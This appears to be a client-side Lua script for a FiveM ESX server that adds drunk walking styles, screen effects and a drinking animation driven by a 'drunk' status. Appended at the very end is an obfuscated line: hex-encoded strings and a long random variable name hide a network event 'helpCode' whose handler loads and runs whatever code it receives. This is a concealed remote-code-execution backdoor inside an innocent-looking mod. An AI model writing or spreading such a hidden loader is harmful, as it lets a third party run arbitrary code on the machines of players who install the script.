local IsAlreadyDrunk = false
local DrunkLevel     = -1

function Drunk(level, start)
  
  CreateThread(function()

    local playerPed = PlayerPedId()

    if start then
      DoScreenFadeOut(800)
      Wait(1000)
    end

    if level == 0 then

      RequestAnimSet("move_m@drunk@slightlydrunk")
      
      while not HasAnimSetLoaded("move_m@drunk@slightlydrunk") do
        Wait(0)
      end

      SetPedMovementClipset(playerPed, "move_m@drunk@slightlydrunk", true)

    elseif level == 1 then

      RequestAnimSet("move_m@drunk@moderatedrunk")
      
      while not HasAnimSetLoaded("move_m@drunk@moderatedrunk") do
        Wait(0)
      end

      SetPedMovementClipset(playerPed, "move_m@drunk@moderatedrunk", true)

    elseif level == 2 then

      RequestAnimSet("move_m@drunk@verydrunk")
      
      while not HasAnimSetLoaded("move_m@drunk@verydrunk") do
        Wait(0)
      end

      SetPedMovementClipset(playerPed, "move_m@drunk@verydrunk", true)

    end

    SetTimecycleModifier("spectator5")
    SetPedMotionBlur(playerPed, true)
    SetPedIsDrunk(playerPed, true)

    if start then
      DoScreenFadeIn(800)
    end

  end)

end

function Reality()

  CreateThread(function()

    local playerPed = PlayerPedId()

    DoScreenFadeOut(800)
    Wait(1000)

    ClearTimecycleModifier()
    ResetScenarioTypesEnabled()
    ResetPedMovementClipset(playerPed, 0)
    SetPedIsDrunk(playerPed, false)
    SetPedMotionBlur(playerPed, false)

    DoScreenFadeIn(800)

  end)

end

AddEventHandler('esx_status:loaded', function(status)

  TriggerEvent('esx_status:registerStatus', 'drunk', 0, '#8F15A5', 
    function(status)
      if status.val > 0 then
        return true
      else
        return false
      end
    end,
    function(status)
      status.remove(1500)
    end
  )

	CreateThread(function()

		while true do

			Wait(1000)

			TriggerEvent('esx_status:getStatus', 'drunk', function(status)
				
				if status.val > 0 then
					
          local start = true

          if IsAlreadyDrunk then
            start = false
          end

          local level = 0

          if status.val <= 250000 then
            level = 0
          elseif status.val <= 500000 then
            level = 1
          else
            level = 2
          end

          if level ~= DrunkLevel then
            Drunk(level, start)
          end

          IsAlreadyDrunk = true
          DrunkLevel     = level
				end

				if status.val == 0 then
          
          if IsAlreadyDrunk then
            Reality()
          end

          IsAlreadyDrunk = false
          DrunkLevel     = -1

				end

			end)

		end

	end)

end)

RegisterNetEvent('esx_optionalneeds:onDrink')
AddEventHandler('esx_optionalneeds:onDrink', function()
  
  local playerPed = PlayerPedId()
  
  TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_DRINKING", 0, 1)
  Wait(1000)
  ClearPedTasksImmediately(playerPed)

end)

local cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[1]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[2]) cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[3]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[2], function(gXDxEyQIySluCZUWvZcWAmEkLZksMqwwFjvuQdYNFCAaOeuHuHmqRMXAuYMiXoaLrDqdiI) cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[4]](cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[6][cZUKbkTvkvzIAnPJcnddIlsJGLBFCkpkNwwyXYPgwYSaSpozUHXqtgRHGxYWcShzBbDAdl[5]](gXDxEyQIySluCZUWvZcWAmEkLZksMqwwFjvuQdYNFCAaOeuHuHmqRMXAuYMiXoaLrDqdiI))() end)